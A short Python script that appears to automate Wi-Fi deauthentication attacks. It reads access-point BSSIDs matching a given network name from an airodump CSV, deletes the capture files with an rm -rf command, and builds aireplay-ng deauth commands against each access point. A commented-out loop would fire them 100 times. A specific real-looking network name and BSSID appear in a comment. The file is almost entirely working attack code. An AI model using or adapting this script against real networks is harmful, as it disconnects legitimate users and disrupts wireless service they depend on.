import csv
import os
import sys

routername = sys.argv[1]

with open("bssidfile-01.csv") as csvfile:
    reader = csv.reader(csvfile, delimiter = ',', quotechar = '"')
    bssidlist = []
    for row in reader:
        if " " + routername in row:
            bssidlist.append(row[0])

print(bssidlist)

os.system("rm -rf bssidfile-*")

cmdlist = []
for bssid in bssidlist:
    #"""aireplay-ng -0 1 -a 04:F0:21:34:B2:2E -e "KVV-sWLAN" wlp2s0mon"""
    cmdlist.append('aireplay-ng -0 1 -a ' + bssid + ' -e "' + routername + '" wlp2s0mon')
print(cmdlist)

""" i = 0
while i < 100:
    i += 1
    for cmd in cmdlist:
        os.system(cmd) """